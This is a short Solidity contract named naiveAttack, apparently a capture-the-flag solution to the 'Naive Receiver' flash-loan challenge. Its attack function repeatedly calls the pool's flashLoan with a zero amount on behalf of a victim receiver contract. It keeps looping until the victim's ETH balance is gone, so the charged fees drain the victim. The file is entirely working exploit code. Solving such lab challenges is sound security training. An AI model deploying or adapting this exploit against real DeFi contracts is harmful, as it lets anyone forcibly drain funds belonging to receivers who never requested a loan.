// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "./FlashLoanReceiver.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint);
}

contract naiveAttack {
    NaiveReceiverLenderPool public pool;
    FlashLoanReceiver victim;
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _victim) {
        pool = NaiveReceiverLenderPool(payable(_pool));
        victim = FlashLoanReceiver(payable(_victim));
    }

    function attack() public {
        while (address(victim).balance > 0) pool.flashLoan(victim, ETH, 0, "");
    }
}
